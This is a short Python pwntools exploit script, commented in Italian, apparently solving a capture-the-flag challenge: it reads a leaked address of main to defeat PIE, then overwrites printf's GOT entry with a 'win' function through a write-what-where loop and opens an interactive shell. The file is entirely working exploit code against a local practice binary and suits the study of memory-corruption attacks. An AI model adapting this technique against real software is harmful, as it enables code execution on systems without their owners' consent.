from pwn import *

# 1. SETUP
exe = './challenge'
elf = ELF(exe)
context.binary = elf # Importante: dice a pwntools se è 32 o 64 bit

p = process(exe)

# 2. RICEVI IL LEAK (Adattato a 32-bit)
# Se il programma è a 32-bit, l'indirizzo è grande 4 byte.
try:
    leak = p.recv(4) # Leggiamo 4 byte
    main_leak = u32(leak) # Convertiamo da byte a numero intero (32 bit)
    print(f"[*] Indirizzo Main leakato: {hex(main_leak)}")
except struct.error:
    print("ERRORE: Non ho ricevuto 4 byte. Forse il programma non sta inviando nulla o è crashato.")
    exit()

# 3. CALCOLA LA BASE (Sconfiggi il PIE)
# Indirizzo Reale - Offset nel file = Base Address (l'inizio del programma in memoria)
base_address = main_leak - elf.symbols['main']
elf.address = base_address # Aggiorniamo pwntools con la nuova base
print(f"[*] Base address calcolato: {hex(base_address)}")

# 4. PREPARA L'ATTACCO
# Ora elf.symbols e elf.got restituiranno gli indirizzi GIUSTI (ricalibrati)
target_win = elf.symbols['oh_look_useful']
got_printf = elf.got['printf']

print(f"[*] GOT Printf: {hex(got_printf)}")
print(f"[*] Target Win: {hex(target_win)}")

# 5. INVIA (Write-What-Where Loop)
# Il ciclo nel C fa: read(where), read(what), *where=what
# read() vuole byte grezzi, quindi usiamo p32()

# Inviamo DOVE scrivere (GOT di printf)
p.send(p32(got_printf)) 

# Inviamo COSA scrivere (Indirizzo di win)
p.send(p32(target_win))

# 6. SHELL
# Ora il programma continuerà il ciclo, chiamerà printf... e boom!
p.interactive()